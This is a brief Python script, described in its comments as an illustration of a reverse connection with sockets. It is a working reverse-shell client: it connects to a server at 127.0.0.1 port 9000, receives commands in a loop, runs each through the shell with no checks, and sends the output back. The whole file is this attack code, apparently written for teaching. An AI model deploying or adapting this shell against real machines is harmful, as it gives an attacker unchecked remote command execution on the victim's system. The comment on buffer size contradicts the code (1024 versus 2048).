import socket
import subprocess
# simple script to illustrate a reverse connection using python sockets

# initialie or get a socket from the OS
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to a server
client_socket.connect(('127.0.0.1', 9000))

while True:
    # receive the message from the server, 
    # but it shouldn't exceed 1024 bytes, and this is why we passed a Buffer size
    # arg of 1024
    cmd = client_socket.recv(2048).decode('utf-8')

    result = subprocess.run(cmd, shell=True, capture_output=True)

    # send the result of the prompt to the server
    client_socket.sendall(bytes(result.stdout))